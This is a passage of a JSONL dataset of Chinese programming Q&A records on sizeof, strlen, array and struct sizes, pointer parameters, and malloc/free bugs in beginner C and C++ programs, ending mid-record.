{"Answer": "&lt;p&gt;x 这种再内存中最后会有一个不可见字符‘\\0’&amp;#xff0c;strlen判断长度是寻找 \\0 的位置&amp;#xff0c;找到及返回长度&amp;#xff1b;&lt;br /&gt;数组长度一般使用sizeof&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["关于数组长度的问题指导一下", ["这23问为什么选C啊，他们用strlen算出来都是7，那长度不应该一样吗，用sizeof算不是算大小吗，数组长度的计算是用sizeof还是strlen，比如int a〔4〕=〔1，2，3〕这个数组，他的长度是16还是12还是3，我麻了，长度是指字节的多少吗"]], "Tag": "程序设计"}
{"Answer": "首先应该明白，数组名相当于数组的第一个元素的地址，所以二维数组的数组名就相当于二维数组第一个元素的地址，只不过这个元素是一个一维数组。在demo中，a是一个二维数组，自然的，a也就是这个二维数组的地址，而地址的大小是8，所以sizeof(a)就是8了；而＊a是对a解引用，而这就相当于是a［0］，a［0］是一个内含5个int元素的一维数组，一个int元素的大小是4，其大小总共为4＊5=20，所以sizeof(＊a)就是20。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["c语言中指针，希望大神解答", ["#include", "\n#define ROW 3", "\n#define COLUMN 5", "\nvoid demo(int a[ROW][COLUMN]) ", "\n{", "\n    printf(\"%d,%d\\n\",sizeof(a),sizeof(*a));", "\n}", "\nint main()", "\n{", "\n    int a[ROW][COLUMN];", "\n    printf(\"%d,%d,%d,%d\\n\",sizeof(a),sizeof(*a),sizeof(a[0]),sizeof(*a[0]));", "\n    demo(a);", "\n    return 0;", "\n}", "\n希望大神解释一下，demo函数中的 输出，为什么sizeof(a)为8?"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;第54行 第55行&lt;br /&gt;int x ;&lt;br /&gt;scanf(&amp;#34;%d&amp;#34;,&amp;amp;x); //gets(x);&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["求快看看 为什么会说使用未初始化的局部变量x 怎么修改", ["\n \n", "#define _CRT_SECURE_NO_WARNINGS", "\n", "#include<stdio.h>", "\n", "#include<string.h>", "\n", "#include<stdlib.h>", "\n", "#include<stdbool.h>", "\n", "#include \"ATM.h\"", "\n \nstruct Date\n{\n    int year;\n    int month;\n    int day;\n};\n \n \nstruct Account           ", "//", "定义结构体\n{\n    char name[", "20", "];\n    char no[", "20", "];\n    int money;\n    char mima[", "6", "];\n    struct Account* ", "next", ";          ", "//", "定义结构体\n};\n \nstruct Record\n{\n    char no[", "20", "];\n    struct Date date;\n    char number;\n};\n \n \n \n", "/*主函数*/", "\nvoid main()\n{\n    char choose; ", "//", "choose为定义输入选择的变量\n    int flag = ", "1", ";\n    struct Record* Phead = NULL; ", "//", "Phead为定义二层头指针\n    struct Account* head = NULL;   ", "//", "head为定义一层头指针\n    printf(", "\"*******************************\\n\"", ");\n    printf(", "\"***欢迎使用ATM自动取款机系统***\\n\"", ");\n    printf(", "\"*******************************\\n\"", ");\n    printf(", "\"——————————————\\n\"", ");\n    printf(", "\"|    1  开户               |\\n\"", ");\n    printf(", "\"——————————————\\n\"", ");\n    printf(", "\"|    2  登陆               |\\n\"", ");\n    printf(", "\"——————————————\\n\"", ");\n    printf(", "\"|    3 前台客户信息查询中心|\\n\"", ");\n    printf(", "\"——————————————\\n\"", ");\n \n    int x ;\n    gets(x);\n    system(", "\"cls\"", ");\n \n    ", "if", " (x > ", "0", " && x < ", "3", ")\n    {\n        switch (x)\n        {\n        case ", "1", ":\n            system(", "\"cls\"", ");\n            kaihu(head);   ", "//", "调用开户函数\n            ", "break", ";\n \n        case ", "2", ":\n            system(", "\"cls\"", ");\n            denglu(head);   ", "//", "调用登陆函数\n            ", "break", ";\n \n        case ", "3", ":\n            system(", "\"cls\"", ");\n            menu();   ", "//", "调用后台菜单函数\n            ", "break", ";\n        }\n    }\n    \n    \n}\n", "/*开户函数*/", "\nvoid kaihu(struct Account* head)\n{\n    head = NULL;\n    FILE* fp;   ", "//", "定义文件指针\n    struct Account* p1 = NULL, * p2 = NULL;   ", "//", "p1,p2为定义链表指针\n    p1 = (struct Account*)malloc(sizeof(struct Account));  ", "//", "开辟内存单元\n    printf(", "\"请输入您的姓名：\\n\"", ");  ", "//", "请数据输入链表中\n    scanf(", "\"%s\"", ", p1->name);\n    printf(", "\"请设置您的卡号：\\n\"", ");\n    scanf(", "\"%s\"", ", p1->no);\n    printf(", "\"请设置您银行卡密码：\\n\"", ");\n    scanf(", "\"%s\"", ", p1->mima);\n    p1->money = ", "0", ";\n    p1->", "next", " = NULL;\n    printf(", "\"您的个人信息为\"", ");\n    printf(", "\"姓名：%s \\n卡号：%s \\n余额：%4d\\n\"", ", p1->name, p1->no, p1->money);\n    ", "if", " (NULL == head)           ", "//", "为新用户开辟内存单元\n    {\n        head = (struct Account*)malloc(sizeof(struct Account));\n        head->", "next", " = p1;    ", "//", "进行头插法，将其作为第一个节点\n    }\n    ", "else", "    ", "//", "为新增客户开辟内存单元\n    {\n        ", "for", " (p2 = head; p2->", "next", " != NULL; p2 = p2->", "next", "); ", "//", "进行尾插\n        p2->", "next", " = p1;\n    }\n    ", "if", " ((fp = fopen(", "\"accounts.txt\"", ", ", "\"ab+\"", ")) == NULL) ", "//", "打开文件\n    {\n        printf(", "\"can not poen file\\n\"", ");\n        return;\n    }\n    ", "if", " (fwrite(p1, sizeof(struct Account), ", "1", ", fp) != ", "1", ")  ", "//", "将链表信息写入文件中\n        printf(", "\"file write error\\n\"", ");\n    fclose(fp);\n    printf(", "\"\\n\"", ");\n    printf(", "\"恭喜您开户成功，请登录\\n\"", ");\n    system(", "\"pause\"", ");\n    system(", "\"cls\"", ");\n    denglu(head);\n}\n \n \n", "//", "登陆函数\n \nvoid denglu(struct Account* head)\n{\n    char d[", "20", "];\n    char mima[", "20", "];\n    int i, j;\n    FILE* fp;     ", "//", "定义文件指针\n    struct Account* p, * q = NULL;\n    ", "if", " ((fp = fopen(", "\"accounts.txt\"", ", ", "\"rb+\"", ")) == NULL)   ", "//", "打开一个二进制文件，为读方式\n    {\n        printf(", "\"不能打开文件\\n\"", ");   ", "//", "如不能打开，则结束程序\n    }\n    p = (struct Account*)malloc(sizeof(struct Account));   ", "//", "申请空间\n    head = p;\n    ", "while", " (!feof(fp))       ", "//", "循环读数据直到文件尾结束\n \n    {\n        ", "if", " (", "1", " != fread(p, sizeof(struct Account), ", "1", ", fp))\n            ", "break", ";   ", "//", "如果没读到数据，跳出循环\n        p->", "next", " = (struct Account*)malloc(sizeof(struct Account));  ", "//", "为下一个结点申请空间\n        q = p;  ", "//", "保存当前节点的指针，作为下一结点的前驱\n        p = p->", "next", ";  ", "//", "指针后移，新读入数据链到当前表尾\n \n    }\n    q->", "next", " = NULL;  ", "//", "最后一个结点的后继指针为空\n    fclose(fp);\n    printf(", "\"  **********************\\n\"", ");\n    printf(", "\"  ***   欢迎来到ATM  ***\\n\"", ");\n    printf(", "\"  **********************\\n\"", ");\n    ", "for", " (j = ", "1", "; j < ", "4", "; j++)      ", "//", "限制卡号输入的次数的循环\n    {\n        printf(", "\"请输入您的卡号\\n\"", ");\n        scanf(", "\"%s\"", ", d);\n        ", "for", " (q = head; q != NULL; q = q->", "next", ")   ", "//", "遍历链表\n        {\n            ", "if", " (strcmp(q->no, d) != ", "0", ")  ", "//", "核对账号\n            {\n                ", "continue", ";   ", "//", "跳出循环\n            }\n            ", "else", "\n            {\n                int count = ", "1", ";\n                ", "while", "(strcmp(q->mima, mima) != ", "0", ")   ", "//", "限制密码输入的次数的循环\n                {\n                    ", "if", " (count < ", "3", ")\n                    {\n                        printf(", "\"\\n\\n请输入您的密码\\n\"", ");\n                        scanf(", "\"%s\"", ", mima);\n                        count++;\n                    }\n                    ", "else", "\n                    {\n                        return false;\n                    }\n                }\n                return true;\n            }\n        }\n \n \n        printf(", "\"\\n\\n\\n您输入的卡号有误，请重试\\n\"", ");\n        system(", "\"pause\"", ");\n        system(", "\"cls\"", ");\n    }\n    printf(", "\"您的卡号三次输入错误，谢谢使用\\n\"", ");\n    ", "exit", "(", "0", ");\n}\n \n \n \n", "//", "银行菜单函数\n \nvoid caidan(struct Account* head)\n{\n    head = NULL;\n    int i;      ", "//i", "为客户选择输入的变量\n    ", "while", " (", "1", ")\n    {\n        printf(", "\"*********************************\\n\"", ");\n        printf(", "\"**  1 取款   *****   2 查询    **\\n\"", ");\n        printf(", "\"*********************************\\n\"", ");\n        printf(", "\"**  3 转账   *****   4 修改密码**\\n\"", ");\n        printf(", "\"*********************************\\n\"", ");\n        printf(", "\"**  5 存款   *****   6 退出    **\\n\"", ");\n        printf(", "\"*********************************\\n\"", ");\n        scanf(", "\"%d\"", ", &i);\n        ", "if", " (i < ", "6", " || i>", "0", ")\n        {\n            switch (i)\n            {\n            case ", "1", ":qukuan(head);       ", "//", "调用银行取款函数\n                system(", "\"pause\"", ");\n                system(", "\"cls\"", ");\n                ", "break", ";\n            case ", "2", ":system(", "\"cls\"", ");\n                chaxun(head);  ", "//", "调用银行查询函数\n                ", "break", ";\n            case ", "3", ":system(", "\"cls\"", ");\n                zhuanzhang(head);  ", "//", "调用银行转账函数\n                ", "break", ";\n            case ", "4", ":system(", "\"cls\"", ");\n                xgmm(head);  ", "//", "调用银行修改密码函数\n                ", "break", ";\n            case ", "5", ":system(", "\"cls\"", ");\n                cunkuan(head);  ", "//", "调用银行存款函数\n                ", "break", ";\n            case ", "6", ":system(", "\"cls\"", ");\n                tuichu();  ", "//", "调用银行退出函数\n                ", "break", ";\n            }\n        }\n        ", "else", "\n        {\n            printf(", "\"您的输入有误\\n\"", ");\n            system(", "\"pause\"", ");\n            system(", "\"cls\"", ");\n        }\n    }\n}\n \n \n", "//", "银行取款函数\nvoid qukuan(struct Account* head)\n{\n    head = NULL;   ", "//", "head为链表头指针\n    int i;\n    FILE* fp;          ", "//", "定义文件指针\n    struct Account* p, * q = NULL;\n    ", "if", " ((fp = fopen(", "\"records.txt\"", ", ", "\"rb+\"", ")) == NULL) ", "//", "打开一个二进制文件，为读方式\n    {\n        printf(", "\"不能打开文件\\n\"", ");  ", "//", "如不能打开，则结束程序\n    }\n    p = (struct Account*)malloc(sizeof(struct Account));  ", "//", "申请空间\n    head = p;\n    ", "while", " (!feof(fp))   ", "//", "循环读数据直到文件尾结束\n    {\n        ", "if", " (", "1", " != fread(p, sizeof(struct Account), ", "1", ", fp))\n            ", "break", ";   ", "//", "如果没有读到数据，跳出循环\n        p->", "next", " = (struct Account*)malloc(sizeof(struct Account));  ", "//", "为下一个结点申请空间\n        q = p;   ", "//", "保存当前结点的指针，作为下一个结点的前驱\n        p = p->", "next", ";  ", "//", "指针后移，新读入数据链到当前表尾\n    }\n    q->", "next", " = NULL;  ", "//", "最后一个结点的后继指针为空\n    fclose(fp);\n    system(", "\"cls\"", ");\n    printf(", "\"请按要求选择您要取款的金额\\n\"", ");\n    scanf(", "\"%d\"", ", &i);\n    ", "if", " (i > ", "6", " || i <= ", "0", ")    ", "//", "限制输入范围\n    {\n        printf(", "\"对不起，您的输入有误\\n\\n\"", ");\n        return;\n    }\n    ", "else", "\n    {\n        i = ", "100", " * i;  ", "//", "对应选项乘以一百为取款金额\n        ", "if", " (i > q->money)\n        {\n            printf(", "\"对不起，您的金额不足\\n\"", ");\n            system(", "\"pause\"", ");\n            system(", "\"cls\"", ");\n            caidan(head);   ", "//", "调用取款机菜单函数\n        }\n        ", "else", "\n        {\n            q->money -= i;  ", "//", "对金额进行处理\n            ", "if", " ((fp = fopen(", "\"records.txt\"", ", ", "\"wb+\"", ")) == NULL)  ", "//", "打开文件\n            {\n                printf(", "\"cannot open file\\n\"", ");\n                return;\n            }\n            ", "if", " (fwrite(q, sizeof(struct Account), ", "1", ", fp) != ", "1", ") ", "//", "将修改的信息重新写入文件\n                printf(", "\"file write error\\n\"", ");\n            printf(", "\"您已经成功取走%d元\\n\"", ");\n            q->", "next", " = NULL;\n            fclose(fp);    ", "//", "关闭文件\n        }\n \n    }\n}\n \n \n", "//", "银行转账函数\nvoid zhuanzhang(struct Account* head)\n{\n    head = NULL;\n    FILE* fp;  ", "//", "定义文件指针\n    struct Account* p, * q = NULL;\n    ", "if", " ((fp = fopen(", "\"records.txt\"", ", ", "\"rb+\"", ")) == NULL)  ", "//", "打开一个二进制文件，为读方式\n    {\n        printf(", "\"不能打开文件\\n\"", ");  ", "//", "如不能打开，则结束程序\n    }\n    p = (struct Account*)malloc(sizeof(struct Account));   ", "//", "申请空间\n    head = p;\n    ", "while", " (!feof(fp))    ", "//", "循环读数据直到文件尾结束\n    {\n        ", "if", " (", "1", " != fread(p, sizeof(struct Account), ", "1", ", fp))\n            ", "break", ";    ", "//", "如果没读到数据，跳出循环\n        p->", "next", " = (struct Account*)malloc(sizeof(struct Account));  ", "//", "为下一个结点申请空间\n        q = p;   ", "//", "保存当前结点的指针，作为下一个结点的前驱\n        p = p->", "next", ";   ", "//", "指针后移，新读入数据链到当前表尾\n    }\n    q->", "next", " = NULL;   ", "//", "最后一个结点的后继指针为空\n    fclose(fp);\n    int i, j, k;\n    printf(", "\"请输入帐号号码\\n\"", ");\n    scanf(", "\"%d\"", ", &i);\n    printf(", "\"请再次输入帐号号码\\n\"", ");   ", "//", "核对卡号\n    scanf(", "\"%d\"", ", &j);\n    ", "if", " (i != j)\n    {\n        printf(", "\"两次账号不同，请重新输入\\n\"", ");\n        zhuanzhang(head);\n    }\n    ", "else", "\n    {\n        system(", "\"cls\"", ");\n        printf(", "\"请输入转账金额\\n\"", ");\n        scanf(", "\"%d\"", ", &k);\n        ", "if", " (k > ", "6", " || k <= ", "0", ")\n        {\n            printf(", "\"对不起，您的输入有误\\n\\n\"", ");\n            return;\n        }\n        ", "else", "\n        {\n            k = k * ", "100", ";\n            ", "if", " (k > q->money)    ", "//", "对余额进行判断\n            {\n                printf(", "\"对不起，您的余额不足\\n\"", ");\n                system(", "\"pause\"", ");\n                system(", "\"cls\"", ");\n                caidan(head);\n            }\n            ", "else", "\n            {\n                printf(", "\"您已成功转账%d元\\n\"", ", k);\n                q->money -= k;\n                ", "if", " ((fp = fopen(", "\"records.txt\"", ", ", "\"wb+\"", ")) == NULL)\n                {\n                    printf(", "\"cannot open file\\n\"", ");\n                    return;\n                }\n                ", "if", " (fwrite(q, sizeof(struct Account), ", "1", ", fp) != ", "1", ")  ", "//", "将数据重新写入文件\n                    printf(", "\"file write error\\n\"", ");\n                q->", "next", " = NULL;\n                fclose(fp);\n                system(", "\"pause\"", ");\n                system(", "\"cls\"", ");\n            }\n        }\n    }\n}\n \n \n \n", "//", "银行查询函数\nvoid chaxun(struct Account* head)\n{\n    head = NULL;  ", "//", "链表头指针\n    FILE* fp;  ", "//", "定义文件指针\n    struct Account* p, * q = NULL;\n    ", "if", " ((fp = fopen(", "\"records.txt\"", ", ", "\"rb+\"", ")) == NULL)  ", "//", "打开一个二进制文件，为读方式\n    {\n        printf(", "\"不能打开文件\\n\"", ");  ", "//", "如不能打开，则结束程序\n    }\n    p = (struct Account*)malloc(sizeof(struct Account));   ", "//", "申请空间\n    head = p;\n    ", "while", " (!feof(fp))    ", "//", "循环读数据直到文件尾结束\n    {\n        ", "if", " (", "1", " != fread(p, sizeof(struct Account), ", "1", ", fp))\n            ", "break", ";    ", "//", "如果没读到数据，跳出循环\n        p->", "next", " = (struct Account*)malloc(sizeof(struct Account));  ", "//", "为下一个结点申请空间\n        q = p;   ", "//", "保存当前结点的指针，作为下一个结点的前驱\n        p = p->", "next", ";   ", "//", "指针后移，新读入数据链到当前表尾\n    }\n    q->", "next", " = NULL;   ", "//", "最后一个结点的后继指针为空\n    fclose(fp);\n    printf(", "\"您卡上原有余额%d元\\n\\n\"", ", q->money);\n    system(", "\"pause\"", ");\n    system(", "\"cls\"", ");\n}\n \n \n", "//", "银行修改密码函数\n", "//", "\n \nvoid xgmm(struct Account* head)\n{\n    head = NULL;     \n    char mima[", "20", "];\n    FILE* fp;  ", "//", "定义文件指针\n    struct Account* p, * q = NULL;\n    ", "if", " ((fp = fopen(", "\"records.txt\"", ", ", "\"rb+\"", ")) == NULL) \n    {\n        printf(", "\"不能打开文件\\n\"", "); \n    }\n    p = (struct Account*)malloc(sizeof(struct Account));   ", "//", "申请空间\n    head = p;\n    ", "while", " (!feof(fp))    \n    {\n        ", "if", " (", "1", " != fread(p, sizeof(struct Account), ", "1", ", fp))\n            ", "break", ";  \n        p->", "next", " = (struct Account*)malloc(sizeof(struct Account));  \n        q = p;  \n        p = p->", "next", ";   \n    }\n    q->", "next", " = NULL;  \n    fclose(fp);\n    printf(", "\"请输入您的原密码\\n\"", ");\n    scanf(", "\"%s\"", ", mima);\n    ", "if", " (strcmp(q->mima, mima) == ", "0", ")  \n{\n        {\n            printf(", "\"密码正确\\n\"", ");\n            printf(", "\"请输入您的新密码:\\n\"", ");\n            scanf(", "\"%s\"", ", q->mima);\n            ", "if", " ((fp = fopen(", "\"accounts.txt\"", ", ", "\"wb+\"", ")) == NULL) \n            {\n                printf(", "\"cannot open file\\n\"", ");\n            }\n            ", "if", " (fwrite(q, sizeof(struct Account), ", "1", ", fp) != ", "1", ")   \n                printf(", "\"file write error\\n\"", ");\n            fclose(fp);\n            printf(", "\"修改密码成功\\n\\n\\n\\n\\n\"", ");\n        }\n    }\n    ", "else", "\n    {\n        printf(", "\"您输入的密码与原密码不同\\n\"", ");\n        return;\n        system(", "\"pause\"", ");\n    }\n    q->", "next", " = NULL;\n}\n \n \n", "//", "银行存款函数\n \n \n \nvoid cunkuan(struct Account* head)\n{\n    int i;\n    head = NULL; \n    FILE* fp; \n    struct Account* p, * q = NULL;\n    ", "if", " ((fp = fopen(", "\"records.txt\"", ", ", "\"rb+\"", ")) == NULL)  \n    {\n        printf(", "\"不能打开文件\\n\"", ");  \n    }\n    p = (struct Account*)malloc(sizeof(struct Account));   \n    head = p;\n    ", "while", " (!feof(fp))    ", "//", "循环读数据直到文件尾结束\n    {\n        ", "if", " (", "1", " != fread(p, sizeof(struct Account), ", "1", ", fp))\n            ", "break", ";    ", "//", "如果没读到数据，跳出循环\n        p->", "next", " = (struct Account*)malloc(sizeof(struct Account));\n        q = p;   \n        p = p->", "next", ";  \n    }\n    q->", "next", " = NULL; \n    fclose(fp);\n    system(", "\"cls\"", ");\n    printf(", "\"您卡上原有余额%d元\\n\"", ", q->money);\n    printf(", "\"请选择您要存入的余额\\n\"", ");\n    scanf(", "\"%d\"", ", &i);\n    ", "if", " (i > ", "6", " || i <= ", "0", ")\n    {\n        printf(", "\"对不起，您的输入有误\\n\\n\"", ");\n        return;\n    }\n    ", "else", "\n    {\n        i = ", "100", " * i;\n        q->money += i;\n        ", "if", " ((fp = fopen(", "\"records.txt\"", ", ", "\"wb+\"", ")) == NULL)  \n        {\n            printf(", "\"cannot open file\\n\"", ");\n        }\n        ", "if", " (fwrite(q, sizeof(struct Account), ", "1", ", fp) != ", "1", ")  \n            printf(", "\"file write error\\n\"", ");\n        printf(", "\"您已经成功存取%d元\\n\"", ", i);\n        q->", "next", " = NULL;\n        fclose(fp);\n        system(", "\"pause\"", ");\n        system(", "\"cls\"", ");\n    }\n}\n \n \n \n", "//", "退出银行函数\n \nvoid tuichu()\n{\n    printf(", "\"谢谢使用\\n\"", ");\n    ", "exit", "(", "0", ");\n}\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;类型是一类统称&amp;#xff0c;比方说10和11都是int型&amp;#xff0c;但是你不能说int型就等于10或者11.只能定义两个int型的变量&amp;#xff0c;然后给他们赋值&amp;#xff0c;比如&amp;#xff0c;int a &amp;#61; 10; int b &amp;#61; 11;&lt;/p&gt;\n\n&lt;p&gt;另外&amp;#xff0c;类型是可以计算其占用的空间的大小的&amp;#xff0c;一个int型的大小是4&amp;#xff0c;上面定义的两个变量&amp;#xff0c;a和b的大小也都是4。计算占用空间大小时&amp;#xff0c;实际是先找到变量的类型&amp;#xff0c;然后计算类型所占空间的大小。&lt;/p&gt;\n\n&lt;p&gt;在你的例子中&amp;#xff0c;可以理解为&amp;#xff1a;结构体类型名就是你定义的su&amp;#xff0c;de是它的一个别名。&lt;/p&gt;\n\n&lt;p&gt;su tt&amp;#xff1b;这句话中&amp;#xff0c;su就是结构体类型名。tt就是su类型的一个变量。&lt;/p&gt;\n\n&lt;p&gt;如有帮助&amp;#xff0c;请采纳一下&amp;#xff0c;谢谢。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["一个小问题希望大神解答", ["\n\n", "//图片截取自", "菜鸟教程 - 学的不仅是技术，更是梦想！ (runoob.com)", "\n\n", " ", "\n\n", "\n", "#include <iostream>\nusing namespace std;\nstruct su {\n    char   a;\n    int    c;\n    double b;\n} de;\n\nint main() {\n    cout << sizeof(su) << endl;\n    cout << sizeof(struct su) << endl;\n    cout << sizeof(de) << endl;\n    return 0;\n}\n/*\n结果为\n16\n16\n16*/", "\n\n", "为什么三者都可以计算出所占的内存空间？", "\n\n", "不是说“对类型不分配内存空间”吗？", "\n\n", "是不是\"结构体名\"能直接当成\"结构体变量\"来使用？", "\n\n", "“结构体类型名”和“结构体名”有什么区别吗？"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;这些都是机器人&amp;#xff0c;服了&amp;#xff0c;还是我来回答你吧&amp;#xff0c;你这里为什么调用函数后没有将p指向NULL呢&amp;#xff0c;是因为你定义出的的p是一个指针&amp;#xff0c;你要换它的指向得定义出一个二级指针来接受&amp;#xff0c;取p的地址传过去&amp;#xff0c;这时候就可以通过操作二级指针将p换指向了。废话不多说&amp;#xff0c;上代码&amp;#xff0c;你参考一下。&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-c\"&gt;&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; * &lt;span class=\"hljs-title\"&gt;create&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;()&lt;/span&gt;&lt;/span&gt;{\n  &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; * p &amp;#61; (&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; *)&lt;span class=\"hljs-built_in\"&gt;malloc&lt;/span&gt;(&lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt;)*&lt;span class=\"hljs-number\"&gt;10&lt;/span&gt;);\n  &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; p;\n}\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;void&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;delete&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; ** p )&lt;/span&gt;&lt;/span&gt;{\n  &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt;(*p &amp;#61;&amp;#61; &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;){\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; ;\n  }\n  &lt;span class=\"hljs-built_in\"&gt;free&lt;/span&gt;(*p);\n  *p &amp;#61; &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;;\n}\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;main&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;()&lt;/span&gt;&lt;/span&gt;{\n  &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; * p ;\n  p &amp;#61; &lt;span class=\"hljs-built_in\"&gt;create&lt;/span&gt;();\n  &lt;span class=\"hljs-built_in\"&gt;delete&lt;/span&gt;(&amp;amp;p);\n  &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n}\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;全是自己一个个字敲的&amp;#xff0c;对你有用的话&amp;#xff0c;还希望采纳哦。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["关于c语言中malloc的一个问题，想请教一下!~", ["#", "include", " ", "<stdio.h>", "\n", "#", "include", " ", "<stdlib.h>", "\n", "int", " * ", "create", "()", "{\n  ", "int", " * p = (", "int", " *)", "malloc", "(", "sizeof", "(", "int", ")*", "10", ");\n  ", "return", " p;\n}\n", "void", " ", "delete", "(", "int", " * p )", "{\n  ", "if", "(p == ", "NULL", "){\n    ", "return", " ;\n  }\n  ", "free", "(p);\n  p = ", "NULL", ";\n}\n", "int", " ", "main", "()", "{\n  ", "int", " * p ;\n  p = ", "create", "();\n  ", "delete", "(p);\n  ", "return", " ", "0", ";\n}\n\n", "\n", "这个代码中，我用create函数在堆中开辟了一块堆空间，返回内存地址，在main中使用指针接收了，并且使用了，使用完毕之后，我要释放这块内存，调用了delete函数，释放了堆空间地址，并将指针置为NULL；此时的main中指针p还是指向堆空间的内存地址，这个时候还需不需要把main中的指针置为NULL呢？"]], "Tag": "程序设计"}
{"Answer": "因为你malloc的空间太小，导致越界写入。破坏了堆空间，所以free出错\r\n(lpStuList)malloc(sizeof(Student));应该改成(lpStuList)malloc(sizeof(StuList));\r\n\r\n```\r\n #include &lt;iostream&gt;\r\n#include &lt;iomanip&gt;\r\n#include &lt;string&gt;\r\nusing namespace std;\r\n#define TRUE 1\r\n#define FALSE 0\r\ntypedef struct Student\r\n{\r\n\tchar num[10];\r\n\tchar name[10];\r\n\tchar grade[10];\r\n}Student;\r\n\r\ntypedef struct StuList\r\n{\r\n\tStudent data;\r\n\tStuList *next;\r\n}StuList, *lpStuList;\r\n\r\nlpStuList stuList = NULL;//全局的学生信息链表\r\nlpStuList head = NULL; //全局的链表头节点\r\n\r\nvoid menu()\r\n{\r\n\tcout &lt;&lt; \"选择(1:输入数据 2:输出数据 3:按姓名查找数据 其他:退出):\" &lt;&lt; endl;\r\n}\r\n\r\nint addStu()\r\n{\r\n\tint num;\r\n\tcout &lt;&lt; \"输入数据\" &lt;&lt; endl &lt;&lt; \"学生人数:\";\r\n\tcin &gt;&gt; num;\r\n\tif (stuList == NULL)\r\n\t{\r\n\t\tstuList = (lpStuList)malloc(sizeof(StuList));\r\n\t\tif (stuList != NULL)\r\n\t\t{\r\n\t\t\tstuList-&gt;next = NULL;\r\n\t\t}\r\n\t}\r\n\tlpStuList cur = NULL;\r\n\tfor (int i = 1; i &lt;= num; ++i)\r\n\t{\r\n\t\tStudent student;\r\n\t\tcur = NULL;\r\n\t\tcur = (lpStuList)malloc(sizeof(StuList));\r\n\t\tcout &lt;&lt; \"第\" &lt;&lt; i &lt;&lt; \"个学生(学号 姓名 成绩):\";\r\n\t\tcin &gt;&gt; student.num &gt;&gt; student.name &gt;&gt; student.grade;\r\n\t\tcur-&gt;data = student;\r\n\t\tcur-&gt;next = NULL;\r\n\t\tif (head == NULL)\r\n\t\t{\r\n\t\t\thead = cur;\r\n\t\t}\r\n\t\telse stuList-&gt;next = cur;\r\n\t\tstuList = cur;\r\n\t}\r\n\treturn TRUE;\r\n}\r\n\r\nint display()\r\n{\r\n\tcout &lt;&lt; \"输出数据\" &lt;&lt; endl;\r\n\tlpStuList cur = NULL;\r\n\tcur = head;\r\n\tif (cur == NULL)\r\n\t{\r\n\t\tcout &lt;&lt; \"没有任何学生信息哦\" &lt;&lt; endl;\r\n\t\treturn FALSE;\r\n\t}\r\n\telse\r\n\t{\r\n\t\tcout &lt;&lt; \"学号\\t\\t姓名\\t\\t成绩\" &lt;&lt; endl;\r\n\t\twhile (cur != NULL)\r\n\t\t{\r\n\t\t\tcout &lt;&lt; cur-&gt;data.num &lt;&lt; \"\\t\\t\" &lt;&lt; cur-&gt;data.name &lt;&lt; \"\\t\\t\" &lt;&lt; cur-&gt;data.grade &lt;&lt; endl;\r\n\t\t\tcur = cur-&gt;next;\r\n\t\t}\r\n\t\treturn TRUE;\r\n\t}\r\n}\r\n\r\nvoid search()\r\n{\r\n\tchar name[10];\r\n\tcout &lt;&lt; \"按姓名查找数据\" &lt;&lt; endl &lt;&lt; \"请输入姓名：\";\r\n\tcin &gt;&gt; name;\r\n\tlpStuList cur = NULL;\r\n\tcur = head;\r\n\tint ok = 0;\r\n\twhile (cur != NULL)\r\n\t{\r\n\t\tif (strstr(cur-&gt;data.name, name) != NULL)\r\n\t\t{\r\n\t\t\tif (ok == 0)\r\n\t\t\t{\r\n\t\t\t\tcout &lt;&lt; \"学号\\t\\t姓名\\t\\t成绩\" &lt;&lt; endl;\r\n\t\t\t\tok = 1;\r\n\t\t\t}\r\n\t\t\tcout &lt;&lt; cur-&gt;data.num &lt;&lt; \"\\t\\t\" &lt;&lt; cur-&gt;data.name &lt;&lt; \"\\t\\t\" &lt;&lt; cur-&gt;data.grade &lt;&lt; endl;\r\n\t\t}\r\n\t\tcur = cur-&gt;next;\r\n\t}\r\n\tif (ok == 0)\r\n\t{\r\n\t\tcout &lt;&lt; \"未找到符合的信息哦\" &lt;&lt; endl;\r\n\t}\r\n}\r\n\r\nvoid exitApp()\r\n{\r\n\tif (head != NULL)\r\n\t{\r\n\t\tlpStuList cur = NULL;\r\n\t\twhile (head != NULL)\r\n\t\t{\r\n\t\t\tcur = head;\r\n\t\t\thead = 